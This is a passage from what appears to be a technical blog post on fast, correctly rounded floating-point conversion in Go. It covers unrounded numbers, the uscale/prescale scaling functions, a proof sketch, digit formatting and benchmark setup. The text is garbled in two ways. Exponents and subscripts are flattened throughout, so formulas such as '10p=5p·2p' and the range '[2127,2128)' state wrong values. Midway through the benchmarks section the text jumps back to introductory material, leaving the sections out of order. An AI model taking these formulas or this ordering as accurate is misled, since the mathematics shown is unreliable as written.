byp.\nSpecifically, we will usepe=⌊log210p⌋−127andpm=⌈10p/2pe⌉,\nensuring thatpm∈[2127,2128).\nWe will write a separate program to generate this table.\nIt emits Go code definingpow10Min,pow10Max, andpow10Tab:pow10Tab[0]holds the entry forp=pow10Min.\nTo figure out how big the table needs to be,\nwe can analyze the three functions we just wrote.FixedWidthconverts floating-point to decimal.\nIt needs to calluscalewith a 53-bitx,e∈[−1137,960], andp∈[−307,341].Shortalso converts floating-point to decimal.\nIt needs to calluscalewith a 55-bitx,e∈[−1137,960], andp∈[−292,324].Parseconverts decimal to floating-point.\nIt needs to calluscalewith a 64-bitxandp∈[−343,289].\n(Outside that range ofp,Parsecan return 0 or infinity.)So the table needs to provide answers forp∈[−343,341].If10p≈pm·2pe, thenx·2e·10p≈x·pm·2e+pe.\nIn all of our algorithms, the result ofuscalewas always small—at most 64 bits.\nSincepmis 128 bits andx·pmis even bigger,e+pemust be negative,\nso this computation is(x*pm) >> -(e+pe).\nBecause of the ceiling,pmmay be too large by an errorε0<1,\nsox·pmmay be too large by an errorε1=x·ε0<x.\nTo round exactly, we care whether any of the shifted bits is 1,\nbutε1may change the lowbits(x)bits,\nso we can’t trust them.\nInstead, we will throw them away.\nand use only the upper bits to compute our unrounded number.\nThat is the entire idea!Now let’s look at the implementation.\nTheprescalefunction returns ascalerwithpmand a shift counts:// A scaler holds derived scaling constants for a given e, p pair.type scaler struct {\n\tpm pmHiLo\n\ts  int\n}// A pmHiLo represents hi<<64 + lo.type pmHiLo struct {\n\thi uint64\n\tlo uint64\n}fpfmt/unopt/fpfmt.go:256,266We want the shift count to reserve two extra bits for the unrounded\nrepresentation and to apply to the top 64-bit word of the 192-bit product,\nwhich gives this formula:s=−(e+pe)−2−(192−64)=−(e+⌊log210p⌋−127)−2−128=−(e+⌊log210p⌋+3)That translates directly to Go:// prescale returns the scaling constants for e, p.// lp must be log2Pow10(p).func prescale(e, p, lp int) scaler {\n\treturn scaler{pm: pow10Tab[p-pow10Min], s: -(e + lp + 3)}\n}fpfmt/fpfmt.go:292,296Inuscale, since the caller left-justifiedxto 64 bits,\ndiscarding the lowbits(x)bits means discarding the\nlowest 64 bits of the product, which we skip computing entirely.\nThen we use the middle 64-bit word and the lowsbits\nof the upper word to set the sticky bit in the result.// uscale returns unround(x * 2**e * 10**p).// The caller should pass c = prescale(e, p, log2Pow10(p))// and should have left-justified x so its high bit is set.func uscale(x uint64, c scaler) unrounded {\n\thi, mid := bits.Mul64(x, c.pm.hi)\n\tmid2, _ := bits.Mul64(x, c.pm.lo)\n\tmid, carry := bits.Add64(mid, mid2, 0)\n\thi += carry\n\tsticky := bool2[unrounded](mid != 0 || hi&((1<<c.s)-1) != 0)\n\treturn unrounded(hi>>c.s) | sticky\n}fpfmt/unopt/fpfmt.go:302,312It is mind-boggling that this works, but it does.\nOf course, you shouldn’t take my word for it.\nWe have to prove it correct.Sketch of a Proof of Fast ScalingTo prove that our fastuscalealgorithm is correct,\nthere are three cases: small positivep,\nsmall negativep,\nand largep.\nThe actual proof, especially for largep,\nis non-trivial,\nand the details are quite a detour from\nour fast scaling implementations,\nso this section only sketches the basic ideas.\nFor the details, see the accompanying post, “Fast Unrounded Scaling: Proof by Ivy.”Remember from the previous section thatpm=⌈10p/2pe⌉=10p/2pe+ε0for someε0<1.\nSince10p=5p·2p,pm’s 128 bits need only represent the5ppart; the2pcan always be handled bype.Forp∈[0,27),5pfits in the top 64 bits of the 128-bitpm.\nSincepmis exact,\nthe only possible error is introduced by discarding the bottombits(x)bits.\nSince the bottom 64 bits ofpmare zero,\nthe bits we discard are all zero.\nSouscaleis correct for small positivep.Forp∈[−27,−1],x·pmis approximating division by5−p(remember that−pis a positive number!).\nThe 128-bit approximation is precise enough that whenxis a\nmultiple of5−p, only the lowestbits(x)bits are non-zero;\ndiscarding them keeps the unrounded form exact.\nAnd whenxis not a multiple of5−p,\nthe result has a fractional part that must be at least1/5−paway from an integer.\nThat fractional separation is much larger than the maximum error in the product,\nso the high bits saved in the unrounded form are correct;\nthe fraction is also repeating, so that there is guaranteed\nto be a 1 bit to cause the unrounded form to be marked inexact.\nSouscaleis correct for small negativep.Finally, we must handle largep, which always have a non-zero error\nand therefore should always return unrounded numbers marked inexact\n(with the sticky bit set to 1).\nConsider the effect of adding a small error to the idealized “correct”x·10p/2pe,\nproducingx·pm.\nThe error is at most 64 bits.\nAdding that error to the 192-bit product can certainly affect\nthe low 64 bits, and it may also generate a carry out of the low 64\ninto the middle 64 bits.\nThe carry turns 1 bits into 0 bits from right to left\nuntil it hits a 0 bit;\nthat first 0 bit becomes a 1, and the carry stops.\nThe key insight is that seeing a 1 in the middle bits\nis proof that the carry did not reach the high bits,\nso the high bits are correct.\n(Seeing a 1 in the middle bits also ensures that\nthe unrounded form is marked inexact, as it must be,\neven though we discarded the low bits.)\nUsing a program backed by careful math, we can analyze all thepmin our table,\nshowing that every possiblex·pmhas a 1 in the middle bits.\nSouscaleis correct for largep.Omit Needless MultiplicationsWe have a fast and correctuscale, but we can make it faster\nnow that we understand the importance of carry bits.\nThe idea is to compute the high 64 bits of the product\nand then use it directly whenever possible, avoiding the computation\nof the remaining 64 bits at all.\nTo make this work, we need the high 64 bits to be rounded up,\na ceiling instead of a floor.\nSo we will change thepmHiLofrom representinghi·264+lotohi·264−lo.// A pmHiLo represents hi<<64 - lo.type pmHiLo struct {\n\thi uint64\n\tlo uint64\n}fpfmt/fpfmt.go:280,284The exact computation using this form would be:hi, mid := bits.Mul64(x, c.pm.hi)\nmid2, lo := bits.Mul64(x, c.pm.lo)\nmid, carry := bits.Sub64(mid, mid2, bool2[uint64](lo > 0))\nhi -= carry\nreturn unrounded(hi >> c.s) | bool2[unrounded](hi&((1<<c.s)-1) != 0 || mid != 0)The 128-bit productx·pm.hicomputed on the first line\nmay be too big by an error of up to264,\nwhich may or may not affect the high 64 bits;\nThe middle three lines correct the product,\npossibly subtracting 1 fromhi.\nLike in the proof sketch, if any of the bottomsbits of the approximatehiis a 1 bit,\nthat 1 bit would stop the subtracted carry from\naffecting the higher bits, indicating that we don’t need to correct the product.Using this insight, the optimizeduscaleis:// uscale returns unround(x * 2**e * 10**p).// The caller should pass c = prescale(e, p, log2Pow10(p))// and should have left-justified x so its high bit is set.func uscale(x uint64, c scaler) unrounded {\n\thi, mid := bits.Mul64(x, c.pm.hi)\n\tsticky := uint64(1)\n\tif hi&(1<<(c.s&63)-1) == 0 {\n\t\tmid2, _ := bits.Mul64(x, c.pm.lo)\n\t\tsticky = bool2[uint64](mid-mid2 > 1)\n\t\thi -= bool2[uint64](mid < mid2)\n\t}\n\treturn unrounded(hi>>c.s | sticky)\n}fpfmt/fpfmt.go:298,310The fix-up looks different from the exact computation above\nbut it has the same effect.\nWe don’t need the actual final value ofmid, only the carry\nand its effect on the sticky bit.On some systems, notably x86-64,bits.Mul64computes both results in a single instruction.\nOn other systems, notably ARM64,bits.Mul64must use two different instructions;\nit helps on those systems to write the code this way,\noptimizing away the computation for the low half ofx·pm.lo.The more bits that are being shifted out ofhi,\nthe more likely it is that a 1 bit is being shifted out,\nso that we have an answer after only the firstbits.Mul64.\nWhenShortcallsuscale, it passes twoxthat\ndiffer only in a single bit\nand multiplies them by the samepm.hi.\nWhile one of them might clear the lowsbits ofhi,\nthe other is unlikely to also clear them,\nso we are likely to hit the fast path at least once,\nif not twice.\nIn the case whereShortcallsuscalethree times,\nwe are likely to hit the fast path at least twice.\nThis optimization means that, most of the time, auscaleis implemented by a single wide multiply.\nThis is the main reason thatShortruns faster than\nRyū, Schubfach, and Dragonbox, as we will see in the next section.PerformanceI promised these algorithms would be simpleandfast.\nI hope you are convinced about simple.\n(If not, keep in mind that the implementations in widespread\nuse today are far more complicated!)\nNow it is time to evaluate ‘fast’\nby comparing against other implementations.\nAll the other implementations are written in C or C++ and compiled by a C/C++ compiler.\nTo isolate compilation differences,\nI translated the Go code to C and measured\nboth the Go code and the C translation.I ran the benchmarks on two systems.Apple M4 (2025 MacBook Air ‘Mac16,12’), 32 GB RAM, macOS 26.1, Apple clang 17.0.0 (clang-1700.6.3.2)AMD Ryzen 9 7950X, 128 GB RAM, Linux 6.17.9 and libc6 2.39-0ubuntu8.6, Ubuntu clang 18.1.3 (1ubuntu1)Both systems used Go 1.26rc1.\nThe full benchmark code is in thersc.io/fpfmtpackage.Printing TextReal implementations generate strings, so we need to write\ncode to convert the integers we have been returning into digit sequences,\nlike this:// formatBase10 formats the decimal representation of u into a.// The caller is responsible for ensuring that a is big enough to hold u.// If a is too big, leading zeros will be filled in as needed.func formatBase10(a []byte, u uint64) {\n\tfor nd := len(a) - 1; nd >= 0; nd-- {\n\t\ta[nd] = byte(u%10 + '0')\n\t\tu /= 10\n\t}\n}fpfmt/unopt/fpfmt.go:368,376Unfortunately, if we connect our fastFixedWidthandShortto this\nversion offormatBase10, benchmarks spend most of their time in the formatting loop.\nThere are a variety of clever ways to speed up digit formatting.\nFor our purposes, it suffices to use the old trick of\nsplitting the number into two-digit chunks and\nthen converting each chunk by\nindexing a 200-byte lookup table (more precisely, a “lookup string”) of all 2-digit values from 00 to 99:// i2a is the formatting of 00..99 concatenated,// a lookup table for formatting [0, 99].const i2a = \"00010203040506070809\" +\n\t\"10111213141516171819\" +\n\t\"20212223242526272829\" +\n\t\"30313233343536373839\" +\n\t\"40414243444546474849\" +\n\t\"50515253545556575859\" +\n\t\"60616263646566676869\" +\n\t\"70717273747576777879\" +\n\t\"80818283848586878889\" +\n\t\"90919293949596979899\"fpfmt/fpfmt.go:353,364Using this table and unrolling the loop to allow the\ncompiler to optimize away bounds checks, we end up withformatBase10:// formatBase10 formats the decimal representation of u into a.// The caller is responsible for ensuring that a is big enough to hold u.// If a is too big, leading zeros will be filled in as needed.func formatBase10(a []byte, u uint64) {\n\tnd := len(a)\n\tfor nd >= 8 {// Format last 8 digits (4 pairs).x3210 := uint32(u % 1e8)\n\t\tu /= 1e8\n\t\tx32, x10 := x3210/1e4, x3210%1e4\n\t\tx1, x0 := (x10/100)*2, (x10%100)*2\n\t\tx3, x2 := (x32/100)*2, (x32%100)*2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\ta[nd-3], a[nd-4] = i2a[x1+1], i2a[x1]\n\t\ta[nd-5], a[nd-6] = i2a[x2+1], i2a[x2]\n\t\ta[nd-7], a[nd-8] = i2a[x3+1], i2a[x3]\n\t\tnd -= 8\n\t}\n\n\tx := uint32(u)\n\tif nd >= 4 {// Format last 4 digits (2 pairs).x10 := x % 1e4\n\t\tx /= 1e4\n\t\tx1, x0 := (x10/100)*2, (x10%100)*2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\ta[nd-3], a[nd-4] = i2a[x1+1], i2a[x1]\n\t\tnd -= 4\n\t}\n\tif nd >= 2 {// Format last 2 digits.x0 := (x % 1e2) * 2\n\t\tx /= 1e2\n\t\ta[nd-1], a[nd-2] = i2a[x0+1], i2a[x0]\n\t\tnd -= 2\n\t}\n\tif nd > 0 {// Format final digit.a[0] = byte('0' + x)\n\t}\n}fpfmt/fpfmt.go:366,406This is more code than I’d prefer, but it is at least straightforward.\nI’ve seen much more complex versions.WithformatBase10, we can buildFmt, which formats in standard exponential notation:// Fmt formats d, p into s in exponential notation.// The caller must pass nd set to the number of digits in d.// It returns the number of bytes written to s.func Fmt(s []byte, d uint64, p, nd int) int {// Put digits into s, leaving room for decimal point.formatBase10(s[1:nd+1], d)\n\tp += nd - 1// Move first digit up and insert decimal point.s[0] = s[1]\n\tn := nd\n\tif n > 1 {\n\t\ts[1] = '.'\n\t\tn++\n\t}// Add 2- or 3-digit exponent.s[n] = 'e'\n\tif p < 0 {\n\t\ts[n+1] = '-'\n\t\tp = -p\n\t} else {\n\t\ts[n+1] = '+'\n\t}\n\tif p < 100 {\n\t\ts[n+2] = i2a[p*2]\n\t\ts[n+3] = i2a[p*2+1]\n\t\treturn n + 4\n\t}\n\ts[n+2] = byte('0' + p/100)\n\ts[n+3] = i2a[(p%100)*2]\n\ts[n+4] = i2a[(p%100)*2+1]\n\treturn n + 5\n}fpfmt/fpfmt.go:312,345When callingFmtwith aFixedWidthresult, we know the digit countndalready.\nFor aShortresult, we can compute the digit count easily from the bit length:// Digits returns the number of decimal digits in d.func Digits(d uint64) int {\n\tnd := log10Pow2(bits.Len64(d))\n\treturn nd + bool2[int](d >= uint64pow10[nd])\n}fpfmt/fpfmt.go:347,351Fixed-Width PerformanceTo evaluate fixed-width printing,\nwe need to decide which floating-point values to convert.\nI generated 10,000 uint64s in the range[1,263−252)and used them as\nfloat64 bit patterns.\nThe limited range avoids negative numbers, infinities, and NaNs.\nThe benchmarks all use Go’sChaCha8-based generatorwith a fixed seed for reproducibility.\nTo reduce timing overhead, the benchmark builds an array of 1000 copies of the value\nand calls a function that converts every value in the array in sequence.\nTo reduce noise, the benchmark times that function call 25 times and uses the median timing.\nWe also have to decide how many digits to ask for:\nlonger sequences are more difficult.\nAlthough I investigated a wider range, in this post I’ll show\ntwo representative widths: 6 digits (Cprintf’s default) and 17 digits\n(the minimum to guarantee accurate round trips, so widely used).The implementations I timed are:dblconv: Loitsch’sdouble-conversion library, using theToExponentialfunction.\nThis library, used in Google Chrome,\nimplements a handful of special cases for small binary exponents\nand falls back to a bignum-based printer for larger exponents.dmg1997: Gay’sdtoa.c,archived in 1997.\nFor our purposes, this represents Gay’s original C implementation\ndescribed in his technical report from 1990  [11].\nI confirmed that this 1997 snapshot runs at the same speed as\n(and has no significant code changes compared to)\nanother copy dating back to May 1991 or earlier.dmg2017: Gay’sdtoa.c,archived in 2017.\nIn 2017, Gay published an updated version ofdtoa.cthat usesuint64math and\na table of 96-bit powers of ten. It is significantly faster than the original version (see below).\nIn November 2025, I confirmed that the latest version runs at the same speed as this one.libc:\nThe C standard library conversion usingsprintf(\"%.*e\", prec-1).\nThe conversion algorithm varies by C library.\nThe macOS C library seems to wrap a pre-2017 version ofdtoa.c,\nwhile Linux’s glibc uses its own bignum-based code.\nIn general the C library implementations have not kept pace\nwith recent algorithms and are slower than any of the others.ryu: Adams’sRyū library, using thed2exp_bufferedfunction.\nIt uses the Ryū Printf algorithm [3].uscale: The unrounded scaling approach, using the Go code in this post.uscalec: A C translation of the unrounded scaling Go code.Here is a scatterplot showing the times required to formatfto 17 digits,\nrunning on the Linux system:(Click on any of the graphs in this post for a larger view.)The X axis is the log of the floating point inputf,\nand\nthe Y axis is the time required for a single conversion of the given input.\nThe scatterplot makes many things clear. For example, it is obvious that\nthere are two kinds of implementations.\nThose that use bignums take longer for large exponents and\nhave a “winged” scatterplot,\nwhile those that avoid bignums run at a mostly constant speed across\nthe entire exponent range.\nThe scatterplot also highlights many interesting data-dependent patterns in the timings,\nmost of which I have not investigated.\nA friend remarked that you could probably spend a whole career\nanalyzing the patterns in this one plot.For our purposes, it would help to have a clearer comparison\nof the speed of the different algorithms.\nThe right tool for that is a plot of the cumulative distribution function (CDF),\nwhich looks like this:Now time is on the X axis (still log scale), and the Y axis plots what\nfraction of the inputs ran in that time or less.\nFor example, we can see that dblconv’s fast path applies to most inputs,\nbut its slow path is much slower than Linux glibc or\neven Gay’s original C library.The CDF only plots the middle 99.9% of timings\n(dropping the 0.05% fastest and slowest),\nto avoid tails caused by measurement noise.\nIn general, measurements are noisier on the Mac because\nARM64 timers only provide ~20ns precision,\ncompared to the x86’s sub-nanosecond precision.Here are the scatterplots and CDFs for 6-digit output on the two systems: Fixed-point numbers have the formf=m·Befor an integer mantissam, constant baseB, and constant (fixed) exponente.\nWe can create fixed-point representations\nin any base, but the most common are base 2 (for computers)\nand base 10 (for people).\nThis diagram shows fixed-point numbers at various scales\nthat can represent numbers between 0 and 1:Using a smaller scaling factor increases precision\nat the cost of larger mantissas.\nWhen representing very large numbers, we can use\nlarger scaling factors to reduce the mantissa size.\nFor example, here are various representations of\nnumbers around one billion:Floating-point numbers are the same as base-2 fixed-point numbers except thatechanges with\nthe overall size of the number.\nSmall numbers use very small scaling factors\nwhile large numbers use large scaling factors,\naiming to keep the mantissas a constant length.\nFor float64s, the exponenteis chosen so that the mantissamhas 53 bits,\nmeaningm∈[252,253).\nFor example, for numbers in[½,1), float64s usee=−53;\nfor numbers in[1,2)they usee=−52;\nand so on.[The notation[a,b)is ahalf-open interval, which includesabut notb.\nIn contrast, theclosed interval[a,b]includes bothaandb.\nWe writex∈[a,b)orx∈[a,b]to say thatxis in that interval.\nUsing this notation,m∈[252,253)means252≤m<253.]In addition to limiting the mantissa size, we must also limit the exponent,\nto keep the overall number a fixed size.\nFor float64s, assumingm∈[252,253), the exponente∈[−1074,971].A float64 consists of 1 sign bit, 11 exponent bits, and 52 mantissa bits.\nThenormal11-bit exponent encodings0x001through0x3fedenotee=−1074throughe=971.\nFor those, the mantissam∈[252,253),\nand it is encoded into only 52 bits by omitting the leading 1 bit.\nThe special exponent encoding0x3ffis used for infinity and not-a-number.\nThat leaves the encoding0x000, which is also special.\nIt denotese=−1074(like0x001does)\nbut with mantissasm∈[0,252)without an implicit leading 1.\nThesesubnormalsordenormalized numbers[8]\ncontinue the fixed-point2−1074scale down to zero,\nwhich ends up encoded (not coincidentally) as 64 zero bits.Other definitions of floating point numbers use different interpretations.\nFor example the IEEE754 standard usesm∈[1,2)withe∈[−1023,1023],\nwhile the C standard libaryfrexpfunction usesm∈[½,1)withe∈[−1022,1024].\nBoth of these choices makemitself a fixed-point number instead of an integer.\nOur integer definition lets us use integer math.\nThese interpretations are all equivalent and differ only by a constant added toe.This description of float64s applies to float32s as well, but with different constants. This table summarizes the two encodings:float32float64sign bits11encoded mantissa bits2352encoded exponent bits811exponent range form∈[1,2)[−127,127][−1023,1023]exponent range for integerm[−150,104][−1074,971]normal numbers[223,224)·2[−150,104][252,253)·2[−1074,971]subnormal numbers[0,223)·2−150[0,252)·2−1074exponent range for 64-bitm[−190,64][−1085,960]normal numbers[263,264)·2[−190,64][263,264)·2[−1085,960]subnormal numbers[0,263)·2−190[0,263)·2−1085To convert a float64 to its bits, we use Go’smath.Float64bits.// unpack64 returns m, e such that f = m * 2**e.// The caller is expected to have handled 0, NaN, and ±Inf already.// To unpack a float32 f, use unpack64(float64(f)).func unpack64(f float64) (uint64, int) {\n\tconst shift = 64 - 53\n\tconst minExp = -(1074 + shift)\n\tb := math.Float64bits(f)\n\tm := 1<<63 | (b&(1<<52-1))<<shift\n\te := int((b >> 52) & (1<<shift - 1))\n\tif e == 0 {\n\t\tm &^= 1 << 63\n\t\te = minExp\n\t\ts := 64 - bits.Len64(m)\n\t\treturn m << s, e - s\n\t}\n\treturn m, (e - 1) + minExp\n}fpfmt/fpfmt.go:23,39To convert back, we use Go’smath.Float64frombits.// pack64 takes m, e and returns f = m * 2**e.// It assumes the caller has provided a 53-bit mantissa m// and an exponent that is in range for the mantissa.func pack64(m uint64, e int) float64 {\n\tif m&(1<<52) == 0 {\n\t\treturn math.Float64frombits(m)\n\t}\n\treturn math.Float64frombits(m&^(1<<52) | uint64(1075+e)<<52)\n}fpfmt/fpfmt.go:41,49[Other presentations use “fraction” and “significand” instead of “mantissa”.\nThis post uses mantissa for consistency with my 2011 post\nand because I generally agree with Agatha Mallett’s excellent\n“In Defense of ‘Mantissa’”.]Unrounded NumbersFloating-point operations are defined as if computed exactly to infinite precision\nand then rounded to the nearest actual floating-point number,\nbreaking ties by rounding to an even mantissa.\nOf course, real implementations don’t use infinite precision;\nthey only keep enough precision to round properly.\nWe will use the same idea.\nIn our algorithms, we want the scaling operation to eventually evaluate to an integer,\nbut we want to give the caller control over the rounding step.\nSo instead of returning an integer, we will return anunrounded number,\nwhich contains all the information needed to round it in a variety of ways.The unrounded form of any real numberx, which we will write as as⟨x⟩,\nis the truncated integer part ofxfollowed by two more bits.\nThose bits indicate (1) whether the fractional part ofxwas at least ½, and (2) whether the fractional part was not exactly 0 or ½.\nIf you think ofxas a real number written in binary, the first extra bit is the bit immediately after the “binary point”—the bit that represents2−1, aka the ½ bit—and the second extra bit is the OR of all the bits after the ½ bit.This definition applies even to numbers that require an infinite binary representation.\nFor example, just as 1/3 requires an infinite decimal representation ‘0.333...’,\n1.6 requires an infinite binary representation ‘1.1001100110011...’.\nThe unrounded version⟨1.6⟩is finite: ‘1.11’.\nBut instead of reading unrounded numbers in binary,\nlet’s print⟨x⟩as‘n.hs’wherenis the integer part⟨x⟩>>2,his 0 or 5, andsis ‘+’ when the second bit is 1.\nThen⟨1.6⟩is written ‘1.5+’.⟨x⟩=⌊4x⌋|(4x≠⌊4x⌋)⟨6exactly⟩=24=‘6.0’⟨6.000001⟩=25=‘6.0+’⟨6.499999⟩=25=‘6.0+’⟨6.5exactly⟩=26=‘6.5’⟨6.500001⟩=27=‘6.5+’⟨6.999999⟩=27=‘6.5+’⟨7exactly⟩=28=‘7.0’Let’s implement unrounded numbers in Go.type unrounded uint64\n\nfunc unround(x float64) unrounded {\n\treturn unrounded(math.Floor(4*x)) | bool2[unrounded](math.Floor(4*x) != 4*x)\n}\n\nfunc (u unrounded) String() string {\n\treturn fmt.Sprintf(\"⟨%d.%d%s⟩\", u>>2, 5*((u>>1)&1), \"+\"[1-u&1:])\n}fpfmt/fpfmt.go:52,61Thebool2function converts a boolean to an integer.\n(The Go compiler will implement this using an inlined conditional move.)// bool2 converts b to an integer: 1 for true, 0 for false.func bool2[T ~int | ~uint64](b bool) T {\n\tif b {\n\t\treturn 1\n\t}\n\treturn 0\n}fpfmt/fpfmt.go:15,21We won’t use theunroundconstructor in our actual code, but it’s helpful for playing.\nFor example, we can try the examples we just saw:row(\"x\", \"raw\", \"str\")\nfor _, x := range []float64{6, 6.001, 6.499, 6.5, 6.501, 6.999, 7} {\n    u := unround(x)\n    row(x, uint64(u), u)\n}\ntable()x      raw  str\n6      24   ⟨6.0⟩\n6.001  25   ⟨6.0+⟩\n6.499  25   ⟨6.0+⟩\n6.5    26   ⟨6.5⟩\n6.501  27   ⟨6.5+⟩\n6.999  27   ⟨6.5+⟩\n7      28   ⟨7.0⟩The unrounded form⟨x⟩holds the information needed by all the usual rounding operations.\nAdding 0, 1, 2, or 3 and then dividing by four (or shifting right by two) yields: floor, round with ½ rounding down, round with ½ rounding up, and ceiling.\nIn floating-point math, we want to round with ½ rounding to even, meaning 1½ and 2½ both round to 2.\nWe can do that by adding1+odd(x),\nwhereodd(x)is 0 or 1 according to whetherxis odd.\nThat’s just the low bit ofx:odd(x)=(x&1)=(⟨x⟩>>2)&1.Putting that all together:⌊⟨x⟩⌋=(⟨x⟩+0)>>2(floor)[⟨x⟩]−=(⟨x⟩+1)>>2(round,halfdown)[⟨x⟩]even=(⟨x⟩+1+odd(x))>>2(round,halftoeven)=(⟨x⟩+1+((⟨x⟩>>2)&1))>>2[⟨x⟩]+=(⟨x⟩+2)>>2(round,halfup)⌈⟨x⟩⌉=(⟨x⟩+3)>>2(ceiling)In Go:func (u unrounded) floor() uint64         { return uint64((u + 0) >> 2) }\nfunc (u unrounded) roundHalfDown() uint64 { return uint64((u + 1) >> 2) }\nfunc (u unrounded) round() uint64         { return uint64((u + 1 + (u>>2)&1) >> 2) }\nfunc (u unrounded) roundHalfUp() uint64   { return uint64((u + 2) >> 2) }\nfunc (u unrounded) ceil() uint64          { return uint64((u + 3) >> 2) }fpfmt/fpfmt.go:62,66row(\"x\", \"floor\", \"round½↓\", \"round\", \"round½↑\", \"ceil\")\nfor _, x := range []float64{6, 6.25, 6.5, 6.75, 7, 7.5, 8.5} {\n    u := unround(x)\n    row(u, u.floor(), u.roundHalfDown(), u.round(), u.roundHalfUp(), u.ceil())\n}\ntable()x       floor  round½↓  round  round½↑  ceil\n⟨6.0⟩   6      6        6      6        6\n⟨6.0+⟩  6      6        6      6        7\n⟨6.5⟩   6      6        6      7        7\n⟨6.5+⟩  6      7        7      7        7\n⟨7.0⟩   7      7        7      7        7\n⟨7.5⟩   7      7        8      8        8\n⟨8.5⟩   8      8        8      9        9Dividing unrounded numbers preserves correct rounding as long as the second extra bit\nis maintained correctly: once it is set to 1, it has to stay a 1 in all future results.\nThis gives the second extra bit its shorter name: thesticky bit.To divide an unrounded number, we do a normal divide but force the sticky bit to 1\nwhen there is a remainder.\nRight shift does the same.⟨x/n⟩=(⟨x⟩/n)|(⟨x⟩modn≠0)|(⟨x⟩&1)⟨x>>n⟩=(⟨x⟩>>n)|(⟨x⟩mod2n≠0)|(⟨x⟩&1)For example, if we rounded 15.4 to an integer 15 and then divided it by 6,\nwe’d get 2.5, which rounds down to 2,\nbut the more precise answer would be 15.4/6 = 2.57, which rounds up to 3.\nAn unrounded division handles this correctly:⟨15.4⟩=61‘15.0+’“alittlemorethan15”⟨15.4/6⟩=11‘2.5+’“alittlemorethan2½”[⟨15.4/6⟩]=3Let’s implement division and right shift in Go:func (u unrounded) div(d uint64) unrounded {\n\tx := uint64(u)\n\treturn unrounded(x/d) | u&1 | bool2[unrounded](x%d != 0)\n}\n\nfunc (u unrounded) rsh(s int) unrounded {\n\treturn u>>s | u&1 | bool2[unrounded](u&((1<<s)-1) != 0)\n}fpfmt/fpfmt.go:69,76u := unround(15.1).div(6)\nfmt.Println(u, u.round())⟨2.5+⟩ 3Finally, we are going to need to be able to nudge an unrounded number\nup or down before computing a ceiling or floor,\nas if we added or subtracting a tiny amount.\nLet’s add that:func (u unrounded) nudge(δ int) unrounded { return u + unrounded(δ) }fpfmt/fpfmt.go:67row(\"x\", \"nudge(-1).floor\", \"floor\", \"ceil\", \"nudge(+1).ceil\")\nfor _, x := range []float64{15, 15.1, 15.9, 16} {\n    u := unround(x)\n    row(u, u.nudge(-1).floor(), u.floor(), u.ceil(), u.nudge(+1).ceil())\n}x        nudge(-1).floor  floor  ceil  nudge(+1).ceil\n⟨15.0⟩   14               15     15    16\n⟨15.0+⟩  15               15     16    16\n⟨15.5+⟩  15               15     16    16\n⟨16.0⟩   15               16     16    17Floating-point hardware maintains three extra bits to round\nall arithmetic operations correctly.\nFor just division and right shift, we can get by with only two bits.Unrounded ScalingThe fundamental insight of this post is that all\nfloating-point conversions can be written correctly\nand simply usingunrounded scaling,\nwhich multiplies a numberxby a power of two and a power of ten\nand returns the unrounded product.uscale(x,e,p)=⟨x·2e·10p⟩.Whenpis negative, the value10pcannot be stored exactly in any finite binary floating-point number,\nso any implementation of uscale must be careful.In Go, we can implement uscale using big integers and an unrounded division:func uscale(x uint64, e, p int) unrounded {\n    num :=   mul(big(4), big(x), pow(2, max(0, p)),  pow(10, max(0, e)))\n    denom := mul(                pow(2, max(0, -p)), pow(10, max(0, -e)))\n    div, mod := divmod(num, denom)\n    return unrounded(div.uint64() | bool2[uint64](!mod.isZero()))\n}Themaxexpressions choose between multiplying2eintonumwhene>0or multiplying2−eintodenomwhene<0,\nand similarly for10p.\nThedivmodimplements the floor, andmod.isZeroreports\nwhether the floor was exact.This implementation of uscale is correct but inefficient.\nIn our usage,eandpwill mostly cancel out,\ntypically with opposite signs,\nand the inputxand resultuscale(x,e,p),\nwill always fit in 64 bits.\nThat limited input domain and range makes it possible\nto implement a very fast, completely accurate uscale,\nand we’ll see that implementation later.Our actual implementation will be split into two functions,\nto allow sharing some computations derived frompande.\nInstead ofuscale(x, e, p), the fast Go version will be called asuscale(x, prescale(e, p, log2Pow10(p))).\nAlso, callers are responsible for passing in anxleft-shifted to have its\nhigh bit set.\nTheunpackfunction we looked at already arranged that for its result,\nbut otherwise callers need to do something like:shift = 64 - bits.Len64(x)\n... uscale(x<<shift, prescale(e-shift, p, log2Pow10(p))) ...Conceptually, uscale maps numbers on one fixed-point scale to numbers on another,\nincluding converting between binary and decimal scales.\nFor example, consider the scales2−13and10−4:Givenxfrom the2−13side,uscale(x,−13,4)maps to the equivalent\npoint on the10−4side;\nand givenxfrom the10−4,uscale(x,13,−4)maps to the equivalent\npoint on the2−13side.\nBefore we look at the fast implementation ofuscale,\nlet’s look at how it simplifies all the floating-point printing\nand parsing algorithms.Fixed-Width PrintingOur first application of uscale is fixed-width printing.\nGivenf=m·2e, we want to compute its\napproximate equivalentd·10de, wheredhas exactlyndigits.\nIt only takes 17 digits to uniquely identify any float64,\nso we’re willing to limitn≤18,\nwhich will ensuredfits in a uint64.\nThe strategy is to multiplyfby10pfor somepand then round it to an integerd.\nThen the result isd·10−p.Then-digit requirement meansd=m·2e·10p∈[10n−1,10n).\nFrom this we can derivep:m·2e·10p∈[10n−1,10n)m·2e·10p∈10n−1·[1,10)[factoringrange](log10m·2e)+p∈n−1+[0,1)[takinglog]p∈n−1−(log10m·2e)+[0,1)[isolatingp]p∈n−1−((log10m·2e)−[0,1))[regrouping]p=n−1−⌊log10m·2e⌋[pisaninteger]p=n−1−⌊(log102)·(e+log2m)⌋[changinglogbase]It is okay forpto be too big—we will get an extra digit that we can divide away—so\nwe can approximatelog2masbits(m)−1, wherebits(m)is the bit length ofm.\nThat gives usp=n−1−⌊(log102)·(e+bits(m)−1)⌋.\nWith this derivation ofp, uscale does the rest of the work.The floor expression is a simple linear function and can be computed\nexactly for our inputs using fixed-point arithmetic:// log10Pow2(x) returns ⌊log₁₀ 2**x⌋ = ⌊x * log₁₀ 2⌋.func log10Pow2(x int) int {// log₁₀ 2 ≈ 0.30102999566 ≈ 78913 / 2^18return (x * 78913) >> 18\n}fpfmt/fpfmt.go:78,82Thelog2Pow10function, which we mentioned above and need to\nuse when callingprescale, is similar:// log2Pow10(x) returns ⌊log₂ 10**x⌋ = ⌊x * log₂ 10⌋.func log2Pow10(x int) int {// log₂ 10 ≈ 3.32192809489 ≈ 108853 / 2^15return (x * 108853) >> 15\n}fpfmt/fpfmt.go:84,88Now we can put everything together:// FixedWidth returns the n-digit decimal form of f as d * 10**p.// n can be at most 18.func 